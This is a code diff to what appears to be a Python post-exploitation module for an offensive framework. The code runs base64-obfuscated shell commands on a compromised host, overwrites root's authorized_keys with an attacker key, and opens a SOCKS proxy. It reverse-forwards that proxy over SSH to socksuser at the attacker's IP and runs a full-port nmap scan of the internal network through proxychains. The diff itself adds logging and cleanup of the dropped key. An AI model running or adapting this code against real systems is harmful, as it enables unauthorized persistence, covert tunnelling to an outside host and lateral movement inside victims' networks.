@@ -50,7 +50,7 @@ class Module(BaseModule):
             payload = base64.b64encode(b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
             session.log(f'Target LAN: {result.stdout}')
-            target_lan = result.stdout
+            target_lan = str(result.stdout)
 
             # transfer files from target to attacker
             session.log("copying private key to target...")
@@ -58,30 +58,31 @@ class Module(BaseModule):
                 with session.platform.open('/tmp/sockskey', 'wb') as f2:
                     f2.write(f1.read())
             result = session.platform.run(f"/bin/bash -c 'chmod 0600 /tmp/sockskey'")
-            session.log("add public key to authorized on target...")
+            session.log("adding public key to authorized on target...")
             with open(f'/home/socksuser/.ssh/socksuser_key.pub','rb') as f1:
                 with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
                     f2.write(f1.read())
             
             # create socksproxy on target
+            session.log('starting socksproxy on target...')
             payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
-            session.log(f'Return Code: {result.returncode}')
-            session.log(f'Output: {result.stdout}')
-            session.log(f'Error Output: {result.stderr}')
+            session.log(f'Result: {result.stdout}')
 
             # forward local socksproxy to attacker
+            session.log('forwarding target socksproxy to attacker...')
             payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
-            session.log(f'Return Code: {result.returncode}')
-            session.log(f'Output: {result.stdout}')
-            session.log(f'Error Output: {result.stderr}')
+            session.log(f'Result: {result.stdout}')
 
             # run nmap scan via proxychains
+            session.log('running proxychains nmap...')
             result = subprocess.run(['proxychains', 'nmap', '-Pn', '-p-', target_lan], cwd='/tmp', capture_output=True, text=True)
-            session.log(f'Return Code: {result.returncode}')
-            session.log(f'Output: {result.stdout}')
-            session.log(f'Error Output: {result.stderr}')
+            session.log(f'Result: {result.stdout}')
+
+            # remove temporary archive from target
+            if session.platform.Path('/tmp/sockskey').exists():
+                session.platform.unlink('/tmp/sockskey')
         elif task_name == "iam2rds":
             try:
                 session.log(f"setting up templates directory: {script_dir}/../resources")
